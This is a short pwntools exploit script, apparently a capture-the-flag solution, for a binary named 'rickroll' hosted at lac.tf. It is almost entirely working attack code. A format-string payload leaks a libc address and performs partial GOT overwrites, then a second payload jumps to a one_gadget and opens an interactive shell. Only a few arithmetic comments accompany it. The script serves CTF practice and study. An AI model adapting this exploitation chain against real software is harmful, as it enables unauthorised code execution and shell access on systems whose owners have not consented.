from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./rickroll"
libc_path = "./libc.so.6"
ld_path = "./ld-2.31.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("lac.tf", 31135)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


payload = b"%39$018p%238c%13$hhn%232c%58$hn%4036c%14$hn"
# hex(0x404000-0x403E18)=0x1e8
# 0x1e8-256=232
# 0x4011ac 0x11ac-0x1e8=4036

payload = payload.ljust(56, b"\0")
payload += p64(0x40406C)
payload += p64(0x404000)

#ddebug("b *_dl_fini+493")
io.sendlineafter("Lyrics:", payload)

io.recvuntil("run around and ")
libc_start_main = int(io.recv(18), 16)
libc.address = libc_start_main - libc.symbols["__libc_start_main"] - 234
success("libc address -> " + hex(libc.address))

one_gadget = libc.address + 0xc961a
payload = p64(0) * 10 + p64(one_gadget)

io.sendline(payload)

io.interactive()
